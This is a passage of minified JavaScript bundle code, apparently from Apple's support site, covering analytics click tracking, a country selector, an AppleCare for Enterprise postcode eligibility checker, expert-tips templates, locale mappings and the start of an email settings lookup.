f=s.closest(".as-thumbnail-box").querySelector(".as-thumbnail");f=null===f.getAttribute(a)?s.closest(".as-thumbnail-content").querySelector(".as-thumbnail-title").textContent:f.getAttribute(l),i=i+"::"+(f="default-video"===i?"default-video":f)}r=m(s.getAttribute("data-analytics-link-url").toLowerCase())}else n="simple link",s.getAttribute(l)?i=s.getAttribute(l).toLowerCase():(i=s.textContent.trim().toLowerCase(),s.classList.contains("ac-gf-breadcrumbs-home")&&(i=s.querySelector(".ac-gf-breadcrumbs-home-label").textContent)),r=m(s.getAttribute("href"));t=function(e,t,n,i){var r={type:e,link_text:t,dest_url:n};return null!==i.closest(".main")&&(r.link_owner="ac_link"),r}(n,i,r,s),o.component={},o.component=t,_(o,c,"acs.link_click"),v(o,c,"link")},window.launchPageLevelTrackFn=function(e,t,n){var i=window._applemd;"search"===(t=t||null)&&null!==t?(i.search=e,v(i,c,"search")):"video"===t&&null!==t?(i.hasOwnProperty("video")&&delete i.video,i.hasOwnProperty("component")&&delete i.component,i.video=e.video,e.hasOwnProperty("comp")&&(i.component=e.comp),v(i,c,"video")):(i.component=e,t="acs.link_click",v(i,c,"link")),_(i,c,t,n)}},f._addClickEventsListener=function(){const e=["a[data-analytics-event]"].concat([".as-richText a",".as-richtext a","#domain_error a"],[".ac-gf-footer-legal-links a",".ac-gf-footer-locale a",".ac-gf-breadcrumbs a"],[".as-sn-msg a",".as-sn-tooltip-wrapper a"]).toString();s(e).forEach((function(e){i(e,"click",window.launchLinkClickTrackFn.bind(this))}))},f._pageMetaValidator=function(){var e={};null!==a?(e=window.launchPageLoadTrackFn(),window._applemd=e):(e.page={site_section:"undefined",content_type:"undefined",content_subtype:"undefined",locale:"undefined"},_(e,c,"acs.pageload")),g()||v(e,c,"load")},t.exports={init:function(){new p}}},{"@marcom/ac-dom-events/utils/addEventListener":82,"@marcom/ac-dom-traversal/querySelector":113,"@marcom/ac-dom-traversal/querySelectorAll":114,"@marcom/ac-event-emitter":124,"@marcom/ac-object/create":185}],485:[function(e,t,n){"use strict";var i=function(){this.regionalObj={"en-asia":"Asia","en-lamr":"Latin America","es-lamr":"América Latina","en-euro":"EMEA"},this.fetchKey=function(e,t){for(var n in e)if(n===t)return e[n]}};t.exports=function(){return new i}},{}],486:[function(e,t,n){"use strict";var i=e("@marcom/ac-dom-traversal/querySelector"),r=e("@marcom/ac-dom-traversal/children"),o=e("@marcom/ac-dom-events/utils/addEventListener"),s=e("./as-custom-country-object.js")(),a=function(){var e,t=i("#as-dropdown"),n=null;function a(){if(e[t.selectedIndex]!==e[0]){t.classList.remove("form-dropdown-selectnone"),localStorage.setItem("selectedCountryIndex",t.selectedIndex);var n={link_owner:"ac_link",name:"country selector",type:"select",link_text:t[t.selectedIndex].textContent,dest_url:window.location.origin+e[t.selectedIndex].value};window.launchPageLevelTrackFn&&window.launchPageLevelTrackFn(n,"acs.link_click",(()=>{window.location.href=n.dest_url}))}}return{init:function(){t&&(e=r(t,"option"),o(t,"change",a),o(window,"pageshow",(function(){event.persisted&&window.location.reload()})),function(){var i=window.location.pathname.split("/")[1],r=s.regionalObj,o=localStorage.getItem("selectedCountryIndex");if(null!==o){var a=parseInt(o);window.location.pathname===e[a].value&&(t[a].selected=!0,t.classList.remove("form-dropdown-selectnone"),localStorage.removeItem("selectedCountryIndex"))}else{r.hasOwnProperty(i)&&(n=s.fetchKey(r,i));for(var c=0;c<t.length;c++)if(null!==n){if(n===t[c].text){t[c].selected=!0,t.classList.remove("form-dropdown-selectnone");break}}else if(window.location.pathname===t[c].value){t[c].selected=!0,t.classList.remove("form-dropdown-selectnone");break}}}())}}};t.exports=function(){(new a).init()}},{"./as-custom-country-object.js":485,"@marcom/ac-dom-events/utils/addEventListener":82,"@marcom/ac-dom-traversal/children":102,"@marcom/ac-dom-traversal/querySelector":113}],487:[function(e,t,n){"use strict";var i=e("@marcom/ac-ajax"),r=e("@marcom/ac-dom-events/utils/addEventListener"),o=e("@marcom/ac-classlist"),s=e("../../utils/as-button-loader"),a=e("@marcom/ac-event-emitter").EventEmitter,c=e("@marcom/ac-object/create"),l=e("@marcom/ac-object/isEmpty"),u=e("@marcom/ac-dom-events/preventDefault"),h=e("@marcom/ac-dom-traversal/querySelector"),d=e("@marcom/ac-dom-traversal/querySelectorAll"),p=e("./json/url.json"),f=new s,m=f.getLocale(),_=function(){return{init:this.init()}},v=_.prototype=c(a.prototype),g="",y={at:{format:/^\d{4}$/},au:{format:/^\d{3,4}$/},be:{format:/^\d{4}$/},ca:{format:/^[A-Z]\d[A-Z]\s\d[A-Z]\d$/,rep:/(\d[A-Z]\d)$/},ch:{format:/^\d{4}$/},de:{format:/^\d{5}$/},dk:{format:/^\d{3,4}$/},es:{format:/^\d{5}$/},fi:{format:/^\d{5}$/},fr:{format:/^\d{5}$/},gb:{format:/^[A-Z]{1,2}\d{1,2}\s\d[A-Z]{2}$|^[A-Z]{1,2}\d{1}[A-Z]{1}\s\d[A-Z]{2}$|^[A-Z]{3}\s\d[A-Z]{2}$/,rep:/(\d[A-Z]{2})$/},in:{format:/^\d{6}$/},it:{format:/^\d{5}$/},kr:{format:/^\d{3}-\d{3}$|\d{5}$/},lu:{format:/^(?:L-)?\d{4}$/},nl:{format:/^\d{4,6}(?:\s[A-Z]{2})?$/},no:{format:/^\d{4}$/},nz:{format:/^\d{4}$/},jp:{format:/^\d{3}-\d{4}$/},pl:{format:/^\d{2}-\d{3}$/},pt:{format:/^\d{4}-\d{3}$/},ru:{format:/^\d{6}$/},se:{format:/^\d{3}\s\d{2}$/,rep:/^(\d{3})(\d{2})$/},tr:{format:/^\d{5}$/},us:{format:/^\d{5}$/}},b=/ca|gb|se/,w=/us|ca|gb|se/;function E(e){u(e),f.showSpinnerOnButton("as-enterprise-input-loader"),f.includeContentUpdating(m),setTimeout((function(){!function(){var e=h("#as-enterprise-input"),t=e.value.trim().toUpperCase(),n=t,i=x();i=i.toLowerCase(),""!==t&&(t=function(e){var t=x();return S(T(function(e,t){var n="";return/\s/.test(e)&&((e.match(/\s/g)||[].length>1)&&"fr"!==t&&(n=e.replace(/\s/g,"")),b.test(t)?b.test(t)&&(n=C(n," $1")):(""!==n&&(e=n),n=e.replace(/\s/g,""))),n=""===n?e:n,w.test(t)&&(n=T(n,t)),n}(e,t=t.toLowerCase()),t),t)}(t),"gb"===i&&"invalid"!==t?t=t.split(" ")[0]:"gb"===i&&"invalid"===t?t="invalid":"gb"!==i&&"invalid"===t&&(t=n));var r=h("#zone1"),s=h("#zone2"),a=h("#zone3"),c=h("#zone4"),l=h("#zone5"),u=JSON.parse(g),p=d(".form-message-wrapper");p.forEach((function(e){o.add(e,"as-enterprise-msg--show")})),""===t||null==t?(o.remove(c,"hide"),o.add(h(".as-enterprise-form-element"),"is-error"),"gb"===i&&(h("#zone4").innerHTML="Please enter a Postcode."),e.setAttribute("aria-describedby",c.id),e.setAttribute("aria-invalid",!0),setTimeout((function(){e.focus()}),990)):"1"===u[t]||"2"===u[t]?(o.remove(r,"hide"),o.add(h(".as-enterprise-form-element"),"is-success"),h(".form-message-wrapper").setAttribute("tabindex","-1"),e.setAttribute("aria-describedby",r.id),e.setAttribute("aria-invalid",!1),setTimeout((function(){p[0].focus()}),990),"gb"===i?h("#zone1").innerHTML="Postcode is eligible for a next-business-day onsite service under AppleCare for Enterprise.":h(".zipcode",h("#zone1")).innerHTML=t):"3"===u[t]||"4"===u[t]?(o.remove(s,"hide"),o.add(h(".as-enterprise-form-element"),"is-success"),"gb"===i?h("#zone2").innerHTML="Postcode is eligible for second-business-day onsite service under AppleCare for Enterprise.":h(".zipcode",h("#zone2")).innerHTML=t,h(".form-message-wrapper").setAttribute("tabindex","-1"),e.setAttribute("aria-describedby",s.id),e.setAttribute("aria-invalid",!1),setTimeout((function(){p[0].focus()}),990)):""!==u[t]&&null!==u[t]&&void 0!==u[t]&&l?Number(u[t])>=5&&(o.remove(l,"hide"),o.add(h(".as-enterprise-form-element"),"is-success"),"gb"===i?h("#zone5").innerHTML="Postcode is eligible for third-business-day or longer onsite service under AppleCare for Enterprise.":h(".zipcode",h("#zone5")).innerHTML=t,h(".form-message-wrapper").setAttribute("tabindex","-1"),e.setAttribute("aria-describedby",l.id),e.setAttribute("aria-invalid",!1),setTimeout((function(){p[0].focus()}),990)):(o.remove(a,"hide"),o.add(h(".as-enterprise-form-element"),"is-error"),"gb"===i?h("#zone3").innerHTML="Postcode is not eligible for onsite service under AppleCare for Enterprise.":h(".zipcode",h("#zone3")).innerHTML=n,e.setAttribute("aria-describedby",a.id),e.setAttribute("aria-invalid",!0),setTimeout((function(){e.focus()}),990))}(),f.hideSpinnerOnButton("as-enterprise-input-loader")}),300)}function k(){d(".form-message-wrapper").forEach((function(e){o.remove(e,"as-enterprise-msg--show")})),Array.from(h(".form-message-wrapper").children).forEach((function(e){o.add(e,"hide")})),o.remove(h(".as-enterprise-form-element"),"is-error"),o.remove(h(".as-enterprise-form-element"),"is-success"),h("#as-enterprise-input").setAttribute("aria-invalid",!1),h("#as-enterprise-input").removeAttribute("aria-describedby"),f.clearContentStatus()}function x(){var e=void 0!==document.documentElement.lang?document.documentElement.lang:"en-US";return e&&e.split("-")[1]?e.split("-")[1]:window.location.pathname.indexOf("/")>-1&&void 0!==window.location.pathname.split("/")[1].split("-")[1]?window.location.pathname.split("/")[1].split("-")[1].toUpperCase():"US"}function S(e,t){return"us"!==t&&"ca"!==t||!(y.us&&y.us.format&&y.us.format.test(e)||y.ca&&y.ca.format&&y.ca.format.test(e))?y[t]&&y[t].format&&y[t].format.test(e)?e:"invalid":e}function T(e,t){var n="",i="";y&&y[t]&&y[t].rep&&(n=y[t].rep,i=e.match(n));var r=e;return e=e.replace(/\s/g,""),"se"===t?r=C(e,n,"$1 $2"):"ca"===t||"us"===t?"invalid"!==S(e,"us")?r=e:("us"===t&&(n=y.ca.rep,i=e.match(n)),i&&(r=C(e,n," $1"))):i&&(r=C(e,n," $1")),r}function C(e,t,n){return e.replace(t,n)}v.init=function(){this.enterpriseLookupForm=h("#as-enterprise-form-wrapper"),this.enterpriseSubmitBtn=h("#as-enterprise-button"),this.enterpriseLookupForm&&(this.lookupInput=h("#as-enterprise-input",this.enterpriseLookupForm),this.lookupInput.setAttribute("maxlength",30),this._addLookupEventsListener())},v._addLookupEventsListener=function(){var e;r(this.enterpriseLookupForm,"submit",E.bind(this)),r(this.lookupInput,"input",k.bind(this)),r(this.enterpriseSubmitBtn,"click",E.bind(this)),e=function(){var e="",t=h("#as-enterprise-form-wrapper").dataset?h("#as-enterprise-form-wrapper").dataset.endpoint:"",n=x();if(p&&!l(p))for(var i in p)i===n&&(e=p[i]);return""===e&&(e="US"),t.replace("{{1}}",e)}(),f.showSpinnerOnButton("as-enterprise--loading"),i.get({url:e,timeout:3e5}).then((function(e){g=e.response,o.add(h("#as-enterprise--loading"),"hide"),f.hideSpinnerOnButton("as-enterprise--loading"),o.remove(h("#as-enterprise-form-wrapper"),"hide")}),(function(e){}))},t.exports=function(){var e=h("#as-enterprise-form-wrapper");e&&new _(e)}},{"../../utils/as-button-loader":507,"./json/url.json":488,"@marcom/ac-ajax":40,"@marcom/ac-classlist":63,"@marcom/ac-dom-events/preventDefault":76,"@marcom/ac-dom-events/utils/addEventListener":82,"@marcom/ac-dom-traversal/querySelector":113,"@marcom/ac-dom-traversal/querySelectorAll":114,"@marcom/ac-event-emitter":124,"@marcom/ac-object/create":185,"@marcom/ac-object/isEmpty":190}],488:[function(e,t,n){t.exports={AT:"AT",AU:"AU",BE:"BE",BR:"PT",CA:"CA",CH:"CH",DE:"DE",DK:"DK",ES:"ES",FI:"FI",FR:"FR",GB:"GB",IN:"IN",IT:"IT",KR:"KR",LU:"LU",NL:"NL",NO:"NO",NZ:"NZ",PL:"PL",PT:"PT",RU:"RU",SE:"SE",TR:"TR",US:"US"}},{}],489:[function(e,t,n){var i=e("hbsfy/runtime");t.exports=i.template({1:function(e,t,n,i,r){var o;return'    <div class=" as-ft-retail-section-cont as-ft-retail-section--cont-bg-fade">\n'+(null!=(o=n.if.call(null!=t?t:{},null!=(o=null!=(o=null!=(o=null!=t?t.responseData:t)?o.article:o)?o.content:o)?o.main:o,{name:"if",hash:{},fn:e.program(2,r,0),inverse:e.program(16,r,0),data:r}))?o:"")+"    </div>\n"},2:function(e,t,n,i,r){var o,s,a,c=null!=t?t:{},l='            <div class="as-ft-section-cont">\n                <div class="as-ft-section">\n                    <div class="as-ft-section-item row">\n                        <div class="as-ft-section-column-first as-ft-section-column-first--hero column large-7 medium-12">\n\n'+(null!=(o=n.if.call(c,null!=(o=null!=(o=null!=(o=null!=(o=null!=t?t.responseData:t)?o.article:o)?o.content:o)?o.main:o)?o.title:o,{name:"if",hash:{},fn:e.program(3,r,0),inverse:e.noop,data:r}))?o:"")+'\n                            <div class="as-expert-tips-summary">\n'+(null!=(o=n.if.call(c,null!=(o=null!=(o=null!=(o=null!=(o=null!=t?t.responseData:t)?o.article:o)?o.content:o)?o.main:o)?o.text:o,{name:"if",hash:{},fn:e.program(5,r,0),inverse:e.noop,data:r}))?o:"")+'                            </div>\n\n                            <span class="as-ft-retail-section-tip-author">\n'+(null!=(o=n.if.call(c,null!=(o=null!=(o=null!=(o=null!=(o=null!=t?t.responseData:t)?o.article:o)?o.content:o)?o.main:o)?o.expertsName:o,{name:"if",hash:{},fn:e.program(7,r,0),inverse:e.noop,data:r}))?o:"")+"                            </span>\n\n";return s=null!=(s=n.expertTipsAnyLinksToShow||(null!=t?t.expertTipsAnyLinksToShow:t))?s:n.helperMissing,a={name:"expertTipsAnyLinksToShow",hash:{},fn:e.program(9,r,0),inverse:e.noop,data:r},o="function"==typeof s?s.call(c,a):s,n.expertTipsAnyLinksToShow||(o=n.blockHelperMissing.call(t,o,a)),null!=o&&(l+=o),l+'\n                        </div>\n\n                        <div class="as-ft-section-column-last as-ft-section-column-last--hero column large-5 large-last medium-12">\n'+(null!=(o=n.if.call(c,null!=(o=null!=(o=null!=(o=null!=(o=null!=t?t.responseData:t)?o.article:o)?o.content:o)?o.main:o)?o.hero:o,{name:"if",hash:{},fn:e.program(14,r,0),inverse:e.noop,data:r}))?o:"")+"                        </div>\n                    </div>\n                </div>\n            </div>\n"},3:function(e,t,n,i,r){var o;return'                                <h2 class="as-ft-section-heading">\n                                    '+(null!=(o=e.lambda(null!=(o=null!=(o=null!=(o=null!=(o=null!=t?t.responseData:t)?o.article:o)?o.content:o)?o.main:o)?o.title:o,t))?o:"")+"\n                                </h2>\n"},5:function(e,t,n,i,r){var o;return"                                    "+(null!=(o=(n.expertTipsText||t&&t.expertTipsText||n.helperMissing).call(null!=t?t:{},null!=(o=null!=(o=null!=(o=null!=(o=null!=t?t.responseData:t)?o.article:o)?o.content:o)?o.main:o)?o.text:o,{name:"expertTipsText",hash:{},data:r}))?o:"")+"\n"},7:function(e,t,n,i,r){var o;return"                                    – "+e.escapeExpression(e.lambda(null!=(o=null!=(o=null!=(o=null!=(o=null!=t?t.responseData:t)?o.article:o)?o.content:o)?o.main:o)?o.expertsName:o,t))+"\n"},9:function(e,t,n,i,r){var o,s,a,c='                            <div class="as-ft-navlink-section as-ft-navlink-section--horizontal">\n\n                                <div class="as-ft-navlink as-ft-navlink--centered-medium as-ft-navlink--centered-small">\n';return s=null!=(s=n.expertTipsLandingLinkHandle||(null!=t?t.expertTipsLandingLinkHandle:t))?s:n.helperMissing,a={name:"expertTipsLandingLinkHandle",hash:{},fn:e.program(10,r,0),inverse:e.program(12,r,0),data:r},o="function"==typeof s?s.call(null!=t?t:{},a):s,n.expertTipsLandingLinkHandle||(o=n.blockHelperMissing.call(t,o,a)),null!=o&&(c+=o),c+"                                </div>\n\n                            </div>\n"},10:function(e,t,n,i,r){var o,s=null!=t?t:{},a=n.helperMissing,c="function",l=e.escapeExpression;return'                                        <a class="as-expert-tips-landing-page-link'+l(typeof(o=null!=(o=n.expertTipsExitLinkExist||(null!=t?t.expertTipsExitLinkExist:t))?o:a)===c?o.call(s,{name:"expertTipsExitLinkExist",hash:{},data:r}):o)+'" href="'+l(typeof(o=null!=(o=n.expertTipsLandingPageUrl||(null!=t?t.expertTipsLandingPageUrl:t))?o:a)===c?o.call(s,{name:"expertTipsLandingPageUrl",hash:{},data:r}):o)+'" '+l(typeof(o=null!=(o=n.expertTipsNoFollowValExist||(null!=t?t.expertTipsNoFollowValExist:t))?o:a)===c?o.call(s,{name:"expertTipsNoFollowValExist",hash:{},data:r}):o)+">\n                                            "+l(typeof(o=null!=(o=n.expertTipsLandingPageLinkText||(null!=t?t.expertTipsLandingPageLinkText:t))?o:a)===c?o.call(s,{name:"expertTipsLandingPageLinkText",hash:{},data:r}):o)+'\n                                            <span class="icon icon-chevronright" aria-hidden="true"></span>\n                                        </a>\n'},12:function(e,t,n,i,r){var o;return"                                        <span>\n                                            "+e.escapeExpression("function"==typeof(o=null!=(o=n.expertTipsLandingPageLinkText||(null!=t?t.expertTipsLandingPageLinkText:t))?o:n.helperMissing)?o.call(null!=t?t:{},{name:"expertTipsLandingPageLinkText",hash:{},data:r}):o)+"\n                                        </span>\n"},14:function(e,t,n,i,r){var o,s=null!=t?t:{},a=n.helperMissing,c=e.escapeExpression;return'                                <img class="as-ft-section-image" src="'+c((n.expertTipsImageUrl||t&&t.expertTipsImageUrl||a).call(s,null!=(o=null!=(o=null!=(o=null!=(o=null!=t?t.responseData:t)?o.article:o)?o.content:o)?o.main:o)?o.hero:o,{name:"expertTipsImageUrl",hash:{},data:r}))+'" alt="'+c((n.expertTipsImgAltText||t&&t.expertTipsImgAltText||a).call(s,null!=(o=null!=(o=null!=(o=null!=(o=null!=t?t.responseData:t)?o.article:o)?o.content:o)?o.main:o)?o.hero:o,{name:"expertTipsImgAltText",hash:{},data:r}))+'" />\n'},16:function(e,t,n,i,r){var o;return null!=(o=e.invokePartial(i["as-common-loader"],t,{name:"as-common-loader",data:r,indent:"            ",helpers:n,partials:i,decorators:e.decorators}))?o:""},compiler:[7,">= 4.0.0"],main:function(e,t,n,i,r){var o;return null!=(o=n.if.call(null!=t?t:{},null!=t?t.showModule:t,{name:"if",hash:{},fn:e.program(1,r,0),inverse:e.noop,data:r}))?o:""},usePartial:!0,useData:!0})},{"hbsfy/runtime":477}],490:[function(e,t,n){"use strict";var i=e("@marcom/ac-ajax"),r=e("lodash.get"),o=e("lodash.indexof"),s=e("@marcom/ac-dom-traversal/querySelector"),a=e("@marcom/ac-object/toQueryParameters"),c=e("@marcom/ac-object/create"),l=e("@marcom/ac-event-emitter").EventEmitter,u=e("@marcom/ac-dom-events/dispatchEvent"),h=s("#as-expert-tips-article");e("./handlebars-helpers");var d={expertTipsTemplateFn:e("./as-expert-tips.hbs"),displayHandle:{showModule:!0,responseData:null}},p=function(){this.expertTipContainer=h,this.expertTipContainer?(this.listOfIDsRawData=[],this.unreadTips=[],this.serviceCallsType="EXPERT_TIPS",this.dataLocal=this.expertTipContainer.attributes["data-locale"]?this.expertTipContainer.attributes["data-locale"].value:"",this.expertTipsAppId=this.expertTipContainer.attributes["data-et-app-id"]?this.expertTipContainer.attributes["data-et-app-id"].value:"",this.lookupAPIUrl=this.expertTipContainer.attributes["data-cds-lookupurl"]?this.expertTipContainer.attributes["data-cds-lookupurl"].value:"",this.listAPIUrl=this.expertTipContainer.attributes["data-cds-listurl"]?this.expertTipContainer.attributes["data-cds-listurl"].value:"",this.addImpressionAPIUrl=this.expertTipContainer.attributes["data-cds-impressionurl"]?this.expertTipContainer.attributes["data-cds-impressionurl"].value:"",this.dataArticleId=this.expertTipContainer.attributes["data-article-id"]?this.expertTipContainer.attributes["data-article-id"].value.replace(/\s/g,"").split(","):"",this.dataFilter=this.expertTipContainer.attributes["data-filter"]?this.expertTipContainer.attributes["data-filter"].value:"",this.init=function(){_(d.displayHandle),this.checkCategorySelection()}):this.init=function(){}},f=p.prototype=c(l.prototype);function m(){d.displayHandle.showModule=!1,_(d.displayHandle)}function _(e){var t=d.expertTipsTemplateFn(e);h.innerHTML=t}f.analyzeListOfTipIDs=function(e){var t=this,n=void 0!==e?e.slice():[],i=t.shuffle(n),r=i.shift()||[],o=i;t.getArticle(r),t.unreadTips=o},f.checkCategorySelection=function(){var e=this;e.dataFilter?e.getListTips():e.analyzeListOfTipIDs(e.dataArticleId)},f.getListTips=function(){var e=this,t={locale:e.dataLocal,filter:e.dataFilter,type:e.serviceCallsType,appid:e.expertTipsAppId},n="?"+a(t),r={url:e.listAPIUrl+n};i.getJSON(r).then((function(e){for(var t=[],n=void 0!==e.tips?e.tips:{},i=0;i<n.length;i++)n[i].hasOwnProperty("id")&&t.push(n[i].id);return t}),(function(){m()})).then((function(t){e.listOfIDsRawData=t,e.analyzeListOfTipIDs(t)}))},f.getArticle=function(e){var t=this,n={locale:t.dataLocal,appid:t.expertTipsAppId,id:e},s="?"+a(n),c={url:t.lookupAPIUrl+s};-1===o(t.listOfIDsRawData,n.id)&&-1===o(t.dataArticleId,n.id)||i.getJSON(c).then((function(e){r(e,"article.content.main")&&r(e,"article.meta.contentType")===t.serviceCallsType&&r(e,"article.articleId.locale")===t.dataLocal?(d.displayHandle.responseData=e,_(d.displayHandle),function(){if(t.addImpressionAPIUrl){var e={url:t.addImpressionAPIUrl+s};i.getJSON(e).then((function(){}))}}(),u(window,"DTMDomReady")):t.unreadTips.length>0?t.analyzeListOfTipIDs(t.unreadTips):m()}),(function(e){404===e.status&&t.unreadTips.length>0?t.analyzeListOfTipIDs(t.unreadTips):m()}))},f.shuffle=function(e){var t,n,i;for(i=e.length;i;i-=1)t=Math.floor(Math.random()*i),n=e[i-1],e[i-1]=e[t],e[t]=n;return e},t.exports=p},{"./as-expert-tips.hbs":489,"./handlebars-helpers":491,"@marcom/ac-ajax":40,"@marcom/ac-dom-events/dispatchEvent":74,"@marcom/ac-dom-traversal/querySelector":113,"@marcom/ac-event-emitter":124,"@marcom/ac-object/create":185,"@marcom/ac-object/toQueryParameters":192,"lodash.get":480,"lodash.indexof":481}],491:[function(e,t,n){"use strict";var i=e("hbsfy/runtime"),r=e("@marcom/ac-dom-traversal/querySelector")("#as-expert-tips-article");i.registerHelper("expertTipsText",(function(e){var t=r.attributes["data-image-serverurl"]?r.attributes["data-image-serverurl"].value:"",n=e&&e.length>0?e:"";return n.replace(new RegExp('src="/library',"g"),'src="'+t+"/library")})),i.registerHelper("expertTipsImageUrl",(function(e){return(r.attributes["data-image-serverurl"]?r.attributes["data-image-serverurl"].value:"")+(e.length>0&&e[0].hasOwnProperty("baseImagePath")?e[0].baseImagePath:"")})),i.registerHelper("expertTipsAnyLinksToShow",(function(e){if(r.attributes["data-cq-et-landingurltext"]&&r.attributes["data-cq-et-landingurltext"].value)return e.fn(this)})),i.registerHelper("expertTipsLandingPageLinkText",(function(){return r.attributes["data-cq-et-landingurltext"]?r.attributes["data-cq-et-landingurltext"].value:""})),i.registerHelper("expertTipsLandingPageUrl",(function(){return r.attributes["data-cq-et-landingurl"]?r.attributes["data-cq-et-landingurl"].value:""})),i.registerHelper("expertTipsLandingLinkHandle",(function(e){var t=r.attributes["data-cq-et-landingurl"]?r.attributes["data-cq-et-landingurl"].value:"",n=e.fn,i=e.inverse;return t?n():i()})),i.registerHelper("expertTipsNoFollowValExist",(function(){return"true"===(r.attributes["data-cq-et-nofollowvalexist"]?r.attributes["data-cq-et-nofollowvalexist"].value:"")?new i.SafeString('rel="nofollow"'):""})),i.registerHelper("expertTipsExitLinkExist",(function(){return"true"===(r.attributes["data-cq-et-exitlinkexist"]?r.attributes["data-cq-et-exitlinkexist"].value:"")?" analytics-exitlink":""})),i.registerHelper("expertTipsImgAltText",(function(e){return e.length>0&&e[0].hasOwnProperty("altText")?e[0].altText:""}))},{"@marcom/ac-dom-traversal/querySelector":113,"hbsfy/runtime":477}],492:[function(e,t,n){"use strict";var i=function(){this.fetchSearchLocale=function(e){return e=e.toLowerCase(),this.searchLocaleMapping={ar_ae:"ar_AE",ar_sa:"ar_SA",ar_om:"ar_OM",ar_qa:"ar_QA",bg_bg:"bg_BG",cs_cz:"cs_CZ",da_dk:"da_DK",de_at:"de_AT",de_ch:"de_CH",de_de:"de_DE",de_li:"de_LI",de_lu:"de_DE",el_gr:"el_GR",en_ae:"en_AE",en_al:"en_AL",en_am:"en_AM",en_ap:"en_AP",en_asia:"en_AP",en_au:"en_AU",en_az:"en_AZ",en_bh:"en_BH",en_bn:"en_BN",en_bw:"en_BW",en_by:"en_BY",en_ca:"en_CA",en_eg:"en_EG",en_gb:"en_GB",en_ge:"en_GE",en_gu:"en_GU",en_gw:"en_GW",en_hk:"en_HK",en_ie:"en_IE",en_il:"en_IL",en_in:"en_IN",en_is:"en_IS",en_jo:"en_JO",en_ke:"en_KE",en_kg:"en_KG",en_kw:"en_KW",en_kz:"en_KZ",en_la:"en_419",en_lamr:"en_419",en_me:"en_ME",en_md:"en_MD",en_mk:"en_MK",en_mt:"en_MT",en_my:"en_MY",en_mz:"en_MZ",en_ng:"en_NG",en_nz:"en_NZ",en_om:"en_OM",en_ph:"en_PH",en_qa:"en_QA",en_sa:"en_SA",en_sg:"en_SG",en_tj:"en_TJ",en_tm:"en_TM",en_ug:"en_UG",en_us:"en_US",en_uz:"en_UZ",en_vn:"en_VN",en_za:"en_ZA",es_cl:"es_CL",es_co:"es_CO",es_es:"es_ES",es_la:"es_419",es_lamr:"es_419",es_mx:"es_MX",et_ee:"et_EE",fi_fi:"fi_FI",fr_be:"fr_BE",fr_ca:"fr_CA",fr_cf:"fr_CF",fr_ch:"fr_CH",fr_ci:"fr_CI",fr_cm:"fr_CM",fr_fr:"fr_FR",fr_gn:"fr_GN",fr_gq:"fr_GQ",fr_lu:"fr_LU",fr_ma:"fr_MA",fr_mg:"fr_MG",fr_ml:"fr_ML",fr_mu:"fr_MU",fr_ne:"fr_NE",fr_sn:"fr_SN",fr_tn:"fr_TN",hr_hr:"hr_HR",hu_hu:"hu_HU",id_id:"id_ID",it_it:"it_IT",ja_jp:"ja_JP",ko_kr:"ko_KR",lt_lt:"lt_LT",lv_lv:"lv_LV",nl_be:"nl_BE",nl_nl:"nl_NL",no_no:"no_NO",pl_pl:"pl_PL",pt_br:"pt_BR",pt_pt:"pt_PT",ro_ro:"ro_RO",ru_ru:"ru_RU",sk_sk:"sk_SK",sl_si:"sl_SI",sv_se:"sv_SE",th_th:"th_TH",tr_tr:"tr_TR",zh_cn:"zh_CN",zh_hk:"zh_HK",zh_tw:"zh_TW"},e&&this.searchLocaleMapping[e]?this.searchLocaleMapping[e]:"en_US"}};t.exports=function(e){return new i}},{}],493:[function(e,t,n){"use strict";var i=e("@marcom/ac-ajax"),r=e("@marcom/ac-classlist"),o=e("@marcom/ac-dom-events/utils/addEventListener"),s=e("../../utils/as-button-loader"),a=e("@marcom/ac-object/create"),c=e("@marcom/ac-event-emitter").EventEmitter,l=e("@marcom/ac-dom-traversal/querySelector"),u=e("@marcom/ac-dom-traversal/querySelectorAll"),h=e("@marcom/ac-dom-events/preventDefault"),d=e("xml2json-light"),p=new s,f=p.getLocale(),m=function(){return{init:this.init()}},_=m.prototype=a(c.prototype);function v(e){var t=e.target;b(t),r.remove(t,"form-textbox-entered"),r.remove(t.parentElement,"is-success")}function g(e){var t=l("#emailAddress"),n=l("#email_error");t.value.length>0?(r.add(t,"form-textbox-entered"),y(this)):w(t,n)}function y(e){var t;h(e),t=l("#emailAddress"),r.add(l(".title-default"),"hide"),r.add(l(".title-mac"),"hide"),r.add(l("#setting-result"),"hide"),r.remove(l(".as-serverdetails-wrapper"),"fadeInDown"),u(".server-rows-wrapper").forEach((function(e){r.add(e,"hide")})),u(".auth-type").forEach((function(e){r.add(e,"hide")})),u(".ssl-type").forEach((function(e){r.add(e,"hide")})),l(".server-results-wrapper").removeAttribute("tabindex"),t.setAttribute("aria-invalid",!1),t.setAttribute("aria-describedby","as-mail-settings-note"),p.clearContentStatus();var n,o=l("#emailAddress"),s=l("#email_error");p.showSpinnerOnButton("as-ms-input-loader"),p.includeContentUpdating(f),n=o.value.trim(),/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/.test(n)?setTimeout((function(){var e;e=l("#as-input-email-wrapper").dataset?l("#as-input-email-wrapper").dataset.endpoint:"",i.get({url:e}).then((function(e){p.hideSpinnerOnButton("as-ms-input-loader"),function(e){for(var t=l("#emailAddress").value.split(/\@/)[1].trim().toLowerCase(),n=!1,i=l(".as-serverdetails-wrapper"),o=l(".server-results-wrapper"),s=l("#domain_error"),a=l("#emailAddress"),c=!1,u=0;u<e.length;u++)if(e[u].name===t){b(l(".form-message-wrapper")),r.remove(l("#setting-result"),"hide"),r.add(l(".form-element",l("#as-input-email-wrapper")),"is-success"),n=!0;var h=e[u].service,d="",p=h.length;p>2?r.remove(l(".title-mac"),"hide"):r.remove(l(".title-default"),"hide"),p>2?r.remove(l(".server-results-divider"),"hide"):r.add(l(".server-results-divider"),"hide");for(var f=0;f<p;f++)d=l("#"+k(h[f],p)),Object.getOwnPropertyNames(h[f]).forEach((function(e){if("ssl"===e){var t=""===h[f][e]?"ssl-yes":"ssl-no";r.remove(l("."+t,d),"hide")}if("authentication"===e){var n=h[f][e].toLowerCase();n="cram-md5"===n?"md5":n,r.remove(l("."+n,d),"hide")}l("."+e,d)&&(l("."+e,d).innerHTML=h[f][e])})),h[f].hasOwnProperty("ssl")||r.remove(l(".ssl-no",d),"hide"),c=h[f].hasOwnProperty("usernameIncludesDomain"),l(".username",d).innerHTML=x(c),d&&r.remove(d,"hide");r.add(i,"fadeInDown"),o.setAttribute("tabindex","-1"),setTimeout((function(){o.focus()}),950),void 